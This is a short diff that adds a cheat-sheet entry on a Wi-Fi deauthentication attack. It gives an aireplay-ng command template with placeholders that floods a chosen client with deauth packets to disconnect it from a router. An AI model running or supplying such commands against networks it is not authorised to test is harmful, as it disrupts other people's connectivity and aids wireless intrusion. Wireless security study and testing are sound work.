@@ -1,0 +1,4 @@
+Deauthentication Attack - Disconnecting device from router - Leaks router name
+
+
+aireplay-ng --deauth X(PACKETS) -a (BSSID/ROUTER) -c (CLIENT/SOURCE/STATION) wlan0mon - Deauthorizes the targeted client, sends X amount of deauth packets to client connected to specified BSSID
